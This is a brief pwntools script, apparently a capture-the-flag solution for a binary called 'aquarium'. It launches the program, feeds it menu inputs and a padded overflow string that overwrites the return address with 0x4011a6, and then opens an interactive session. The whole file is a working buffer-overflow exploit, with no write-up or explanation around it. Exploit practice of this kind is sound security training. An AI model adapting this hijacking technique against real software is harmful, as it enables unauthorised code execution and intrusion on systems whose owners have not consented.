from pwn import *

p = process("./aquarium")

p.sendline("2\n2\n2\n2\n2\na" + "AAAAAAAA"*19 + p64(0x00000000004011a6))

p.interactive()